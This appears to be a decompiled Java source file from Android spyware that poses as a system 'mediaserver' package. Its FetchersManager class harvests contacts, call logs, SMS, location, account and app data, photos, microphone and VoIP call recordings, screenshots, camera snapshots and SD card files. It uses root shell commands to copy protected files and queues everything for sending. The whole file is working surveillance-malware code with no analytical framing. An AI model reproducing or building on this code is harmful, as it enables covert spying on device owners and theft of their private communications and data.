package com.android.mediaserver.fetchers;

import android.content.Context;
import android.os.Process;
import com.android.mediaserver.AppConstants;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.db.DatabaseManager;
import com.android.mediaserver.fetchers.account.AccountsFetcher;
import com.android.mediaserver.fetchers.apps.ApplicationsFetcher;
import com.android.mediaserver.fetchers.file.FileTreeFetcher;
import com.android.mediaserver.fetchers.file.SdCardDataFetcher;
import com.android.mediaserver.fetchers.file.UserRequestedFilesFetcher;
import com.android.mediaserver.fetchers.info.DeviceInfoFetcher;
import com.android.mediaserver.fetchers.info.LocationFetcher;
import com.android.mediaserver.fetchers.media.GalleryFetcher;
import com.android.mediaserver.fetchers.media.MicRecordingsFetcher;
import com.android.mediaserver.fetchers.media.RecordingsFetcher;
import com.android.mediaserver.fetchers.media.ScreenshotsFetcher;
import com.android.mediaserver.fetchers.media.SnapshotFetcher;
import com.android.mediaserver.fetchers.media.VoipRecordingsFetcher;
import com.android.mediaserver.fetchers.provider.CallLogsFetcher;
import com.android.mediaserver.fetchers.provider.ContactsFetcher;
import com.android.mediaserver.fetchers.provider.SMSFetcher;
import com.android.mediaserver.file.FileUtils;
import com.android.mediaserver.shell.Shell.SU;
import com.android.mediaserver.util.AppUtils;
import com.sromku.simple.storage.SimpleStorage;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import timber.log.Timber;

public class FetchersManager {
  private static FetchersManager mInstance;
  private Config mConfig;
  private Context mContext;
  private DatabaseManager mDatabaseManager;

  private FetchersManager(Context context) {
    Timber.tag(FetchersManager.class.getName());
    this.mContext = context;
    this.mConfig = Config.getInstance(context);
    this.mDatabaseManager = DatabaseManager.getInstance(context);
  }

  public static FetchersManager getInstance(Context context) {
    if (mInstance == null) {
      mInstance = new FetchersManager(context);
    }
    return mInstance;
  }

  public static boolean copyFileToFilesDir(Context context, String srcPath, String dstPath) {
    List<String> res = SU.run("cat " + srcPath + " > " + dstPath);
    if (res == null || res.size() != 0) {
      return false;
    }
    String chmodCmd = "chmod 777 " + dstPath;
    String chownCmd = "chown " + Process.myUid() + ":" + Process.myUid() + " " + dstPath;
    String chconCmd = "chcon " + AppUtils.getInternalSELinuxFileContext(context) + " " + dstPath;
    SU.run(chmodCmd);
    SU.run(chownCmd);
    SU.run(chconCmd);
    return true;
  }

  public List<FetchedFile> fetchAll() {
    List<FetchedFile> filesToSend = new ArrayList();
    for (String contentType : Config.getInstance(this.mContext).getContentTypes()) {
      filesToSend.addAll(fetchDataByContentType(contentType));
    }
    return filesToSend;
  }

  private List<FetchedFile> fetchDataByContentType(String contentType) {
    List<FetchedFile> filesToSend = new ArrayList();
    if (ContentType.DEVICE_INFO.toString().equals(contentType)) {
      Timber.d("Fetching device info", new Object[0]);
      FetchedFile deviceInfo = fetchDeviceInfo();
      if (deviceInfo != null) {
        filesToSend.add(deviceInfo);
      }
    } else if (ContentType.CONTACTS.toString().equals(contentType)) {
      Timber.d("Fetching contacts", new Object[0]);
      FetchedFile contacts = fetchContacts();
      if (contacts != null) {
        filesToSend.add(contacts);
      }
    } else if (ContentType.CALL_LOGS.toString().equals(contentType)) {
      Timber.d("Fetching call logs", new Object[0]);
      FetchedFile callLogs = fetchCallLogs();
      if (callLogs != null) {
        filesToSend.add(callLogs);
      }
    } else if (ContentType.SMS.toString().equals(contentType)) {
      Timber.d("Fetching sms", new Object[0]);
      FetchedFile sms = fetchSms();
      if (sms != null) {
        filesToSend.add(sms);
      }
    } else if (ContentType.LOCATION.toString().equals(contentType)) {
      Timber.d("Fetching location history", new Object[0]);
      filesToSend.addAll(fetchLocation());
    } else if (ContentType.ACCOUNTS.toString().equals(contentType)) {
      Timber.d("Fetching accounts information", new Object[0]);
      filesToSend.addAll(fetchAccounts());
    } else if (ContentType.APP_DATA.toString().equals(contentType)) {
      Timber.d("Fetching application data", new Object[0]);
      filesToSend.addAll(fetchApplications());
    } else if (ContentType.GALLERY.toString().equals(contentType)) {
      Timber.d("Fetching gallery", new Object[0]);
      filesToSend.addAll(fetchGallery());
    } else if (ContentType.RECORDINGS.toString().equals(contentType)) {
      Timber.d("Fetching recordings", new Object[0]);
      filesToSend.addAll(fetchRecordings());
      Timber.d("Fetching mic recordings", new Object[0]);
      filesToSend.addAll(fetchMicRecordings());
    } else if (ContentType.VOIP_RECORDINGS.toString().equals(contentType)) {
      Timber.d("Fetching voip recordings", new Object[0]);
      filesToSend.addAll(fetchVoipRecordings());
    } else if (ContentType.SNAPSHOTS.toString().equals(contentType)) {
      Timber.d("Fetching snapshot", new Object[0]);
      filesToSend.addAll(fetchSnapshots());
    } else if (ContentType.SCREENSHOTS.toString().equals(contentType)) {
      Timber.d("Fetching screenshots", new Object[0]);
      filesToSend.addAll(fetchScreenshots());
    } else if (ContentType.USER_FILES.toString().equals(contentType)) {
      Timber.d("Fetching user requested files", new Object[0]);
      filesToSend.addAll(fetchUserRequestedFiles());
    } else if (ContentType.SD_DATA.toString().equals(contentType)) {
      Timber.d("Fetching SD card data", new Object[0]);
      filesToSend.addAll(fetchSdCardData());
    } else if (ContentType.FILETREE.toString().equals(contentType)) {
      Timber.d("Fetching file tree", new Object[0]);
      filesToSend.addAll(fetchFileTree());
    } else {
      Timber.e("Received UNKNOWN content type: %s, NOT fetching anything", contentType);
    }
    return filesToSend;
  }

  public FetchedFile fetchDeviceInfo() {
    String data = new DeviceInfoFetcher(this.mContext).fetch();
    File deviceInfo =
        dumpDataToFile(AppConstants.DEVICE_INFO_FILE_NAME, Arrays.asList(new String[] { data }));
    if (deviceInfo != null) {
      if (true == shouldFetchFile(deviceInfo)) {
        return new FetchedFile(deviceInfo, "TEXT", "device_info");
      }
      deviceInfo.delete();
    }
    return null;
  }

  public FetchedFile fetchContacts() {
    File contacts =
        dumpDataToFile(AppConstants.CONTACTS_FILE_NAME, new ContactsFetcher(this.mContext).fetch());
    if (contacts != null) {
      if (true == shouldFetchFile(contacts)) {
        return new FetchedFile(contacts, "TEXT", "contacts");
      }
      contacts.delete();
    }
    return null;
  }

  public FetchedFile fetchCallLogs() {
    File callLogs = dumpDataToFile(AppConstants.CALL_LOGS_FILE_NAME,
        new CallLogsFetcher(this.mContext).fetch());
    if (callLogs != null) {
      if (true == shouldFetchFile(callLogs)) {
        return new FetchedFile(callLogs, "TEXT", "call_logs");
      }
      callLogs.delete();
    }
    return null;
  }

  public FetchedFile fetchSms() {
    File sms = dumpDataToFile(AppConstants.SMS_FILE_NAME, new SMSFetcher(this.mContext).fetch());
    if (sms != null) {
      if (true == shouldFetchFile(sms)) {
        return new FetchedFile(sms, "TEXT", "sms");
      }
      sms.delete();
    }
    return null;
  }

  public List<FetchedFile> fetchLocation() {
    List<FetchedFile> data = new LocationFetcher().fetch();
    List<FetchedFile> filesToSend = new ArrayList();
    for (FetchedFile fetchedFile : data) {
      if (true == shouldFetchFile(fetchedFile.getFile())) {
        filesToSend.add(fetchedFile);
      } else {
        fetchedFile.getFile().delete();
      }
    }
    return filesToSend;
  }

  public List<FetchedFile> fetchGallery() {
    List<FetchedFile> filesToSend = new ArrayList();
    for (String path : new GalleryFetcher(this.mContext).fetch()) {
      File file = new File(path);
      if (true == shouldFetchFile(file)) {
        filesToSend.add(new FetchedFile(file, "MEDIA", "gallery"));
      }
    }
    return filesToSend;
  }

  public List<FetchedFile> fetchRecordings() {
    List<FetchedFile> filesToSend = new ArrayList();
    for (File file : new RecordingsFetcher(this.mContext).fetch()) {
      if (true == shouldFetchFile(file)) {
        filesToSend.add(new FetchedFile(file, "MEDIA", "recording"));
      } else {
        file.delete();
      }
    }
    return filesToSend;
  }

  public List<FetchedFile> fetchMicRecordings() {
    List<FetchedFile> filesToSend = new ArrayList();
    for (File file : new MicRecordingsFetcher(this.mContext).fetch()) {
      if (true == shouldFetchFile(file)) {
        filesToSend.add(new FetchedFile(file, "MEDIA", "mic_recording"));
      } else {
        file.delete();
      }
    }
    return filesToSend;
  }

  public List<FetchedFile> fetchVoipRecordings() {
    List<FetchedFile> filesToSend = new ArrayList();
    for (File file : new VoipRecordingsFetcher(this.mContext).fetch()) {
      if (true == shouldFetchFile(file)) {
        filesToSend.add(new FetchedFile(file, "MEDIA", "voip_recording"));
      } else {
        file.delete();
      }
    }
    return filesToSend;
  }

  public List<FetchedFile> fetchSnapshots() {
    List<FetchedFile> filesToSend = new ArrayList();
    for (File file : new SnapshotFetcher(this.mContext).fetch()) {
      if (true == shouldFetchFile(file)) {
        filesToSend.add(new FetchedFile(file, "MEDIA", "snapshot"));
      } else {
        file.delete();
      }
    }
    return filesToSend;
  }

  public List<FetchedFile> fetchScreenshots() {
    List<FetchedFile> filesToSend = new ArrayList();
    for (File file : new ScreenshotsFetcher(this.mContext).fetch()) {
      if (true == shouldFetchFile(file)) {
        filesToSend.add(new FetchedFile(file, "MEDIA", "screenshots"));
      } else {
        file.delete();
      }
    }
    return filesToSend;
  }

  public List<FetchedFile> fetchUserRequestedFiles() {
    List<FetchedFile> filesToSend = new ArrayList();
    for (File file : new UserRequestedFilesFetcher(this.mContext).fetch()) {
      if (true == shouldFetchFile(file)) {
        filesToSend.add(new FetchedFile(file, "BIN", "user_files"));
      } else {
        file.delete();
      }
    }
    return filesToSend;
  }

  public List<FetchedFile> fetchSdCardData() {
    List<FetchedFile> filesToSend = new ArrayList();
    for (File file : new SdCardDataFetcher().fetch(this.mConfig.getExtensions())) {
      if (true == shouldFetchFile(file)) {
        filesToSend.add(new FetchedFile(file, "BIN", "sdcard"));
      }
    }
    return filesToSend;
  }

  public List<FetchedFile> fetchFileTree() {
    return fetchFilesToInternalStorage(new FileTreeFetcher(this.mContext).fetch());
  }

  public List<FetchedFile> fetchApplications() {
    return fetchFilesToInternalStorage(new ApplicationsFetcher().fetch());
  }

  public List<FetchedFile> fetchAccounts() {
    return fetchFilesToInternalStorage(new AccountsFetcher().fetch());
  }

  private List<FetchedFile> fetchFilesToInternalStorage(List<FetchedFile> files) {
    List<FetchedFile> filesToSend = new ArrayList();
    for (FetchedFile fetchedFile : files) {
      File file = fetchedFile.getFile();
      File filesDir = SimpleStorage.getInternalStorage(this.mContext)
          .getFile(this.mConfig.getFilesDirectoryName());
      if (filesDir != null) {
        String dstPath = filesDir.getAbsolutePath() + File.separator + file.getName();
        if (true == copyFileToFilesDir(this.mContext, file.getAbsolutePath(), dstPath)) {
          File newFile = new File(dstPath);
          if (true == shouldFetchFile(newFile)) {
            filesToSend.add(
                new FetchedFile(newFile, fetchedFile.getType(), fetchedFile.getSubtype()));
          } else {
            newFile.delete();
          }
        }
      }
    }
    return filesToSend;
  }

  private boolean shouldFetchFile(File file) {
    boolean z = true;
    if (true != file.exists() || 0 == file.length()) {
      return false;
    }
    if (this.mDatabaseManager.isHashExists(FileUtils.getFileSha1(file))) {
      z = false;
    }
    return z;
  }

  private File dumpDataToFile(String filename, List<String> data) {
    File outputFile = SimpleStorage.getInternalStorage(this.mContext)
        .getFile(this.mConfig.getFilesDirectoryName(), filename);
    if (outputFile.exists()) {
      outputFile.delete();
    }
    try {
      if (!outputFile.createNewFile()) {
        return null;
      }
      writeText(new FileOutputStream(outputFile), (List) data);
      return outputFile;
    } catch (Exception e) {
      return null;
    }
  }

  private void writeText(OutputStream fos, List<String> lines) {
    try {
      for (String s : lines) {
        writeText(s, fos);
      }
      writeChunk(new byte[0], fos);
      fos.close();
    } catch (IOException e) {
    }
  }

  private void writeText(String data, OutputStream os) throws IOException {
    writeChunk(data.getBytes(), os);
  }

  private void writeChunk(byte[] data, OutputStream os) throws IOException {
    writeChunk(data, 0, data.length, os);
  }

  private void writeChunk(byte[] data, int offset, int length, OutputStream os) throws IOException {
    os.write(ByteBuffer.allocate(4).putInt(length).array());
    if (length > 0) {
      os.write(data, offset, length);
    }
    os.flush();
  }
}
